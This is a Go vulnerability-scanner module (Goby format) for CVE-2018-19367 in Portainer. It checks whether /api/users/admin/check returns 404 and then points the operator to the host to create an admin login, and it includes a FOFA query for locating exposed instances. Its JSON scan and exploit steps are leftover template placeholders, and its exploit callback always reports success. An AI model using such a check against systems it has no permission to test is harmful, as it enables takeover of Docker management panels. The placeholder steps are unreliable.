package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Portainer /api/users/admin/check Unauthorized Access Vulnerability(CVE-2018-19367)",
    "Description": "<p>Portainer through 1.19.2 provides an API endpoint (/api/users/admin/check) to verify that the admin user is already created. This API endpoint will return 404 if admin was not created and 204 if it was already created.</p><p>Attackers can set an admin password in the 404 case.</p>",
    "Product": "portainer",
    "Homepage": "https://www.portainer.io/",
    "DisclosureDate": "2018-11-20",
    "PostTime": "2024-07-16",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"Portainer\" && body=\"Portainer.io\"",
    "GobyQuery": "title=\"Portainer\" && body=\"Portainer.io\"",
    "Level": "2",
    "Impact": "<p>Attackers can set an admin password in the 404 case.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://portainer.io/\">https://portainer.io/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "showInfo",
            "type": "select",
            "value": "showInfo",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2018-19367"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Portainer /api/users/admin/check 未授权访问漏洞（CVE-2018-19367）",
            "Product": "portainer",
            "Description": "<p>Portainer是一款用于管理Docker环境和Docker主机的轻量级用户管理界面。&nbsp;</p><p>Portainer 1.19.2及之前版本中存在安全漏洞，该漏洞源于在管理员未被创建时，用于验证的API端点会返回404，而管理员已被创建时，则会返回204。攻击者可以在404案例中设置管理员密码。<br></p>",
            "Recommendation": "<p>目前厂商暂未发布修复措施解决此安全问题，建议使用此软件的用户随时关注厂商主页或参考网址以获取解决办法：<a href=\"https://portainer.io/\">https://portainer.io/</a><br></p>",
            "Impact": "<p>攻击者可以在404案例中设置管理员密码<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Portainer /api/users/admin/check Unauthorized Access Vulnerability(CVE-2018-19367)",
            "Product": "portainer",
            "Description": "<p>Portainer through 1.19.2 provides an API endpoint (/api/users/admin/check) to verify that the admin user is already created. This API endpoint will return 404 if admin was not created and 204 if it was already created.</p><p>Attackers can set an admin password in the 404 case.<br></p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:&nbsp;<a href=\"https://portainer.io/\">https://portainer.io/</a><br></p>",
            "Impact": "<p>Attackers can set an admin password in the 404 case.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10972"
}`
	sendPayloaddasnudiafiuhqiuncfuqihhdw := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		// 注意：返回的第一个值为bool值，若成功请返回true，否则返回false
		vulInfo := ``
		vulPath := `/api/users/admin/check`
		requestConfig := httpclient.NewGetRequestConfig(vulPath)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig); err == nil {
			//404就有漏洞，204则没有漏洞，返回包json内容可能不同，所以就没有通过返回包内容来更加精确的判断，只是通过状态码来判断
			if resp.StatusCode == 404 {
				vulInfo = "Please visit the following url to create a user login backend:\n" + hostInfo.FixedHostInfo
				return true, vulInfo, vulPath
			}
		}
		return false, vulInfo, vulPath
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, _, vulPath := sendPayloaddasnudiafiuhqiuncfuqihhdw(hostInfo)
			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.Scheme() + "://" + hostInfo.HostInfo + vulPath
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			_, vulInfo, _ := sendPayloaddasnudiafiuhqiuncfuqihhdw(expResult.HostInfo)
			expResult.Output = vulInfo
			expResult.Success = true
			return expResult
		},
	))
}
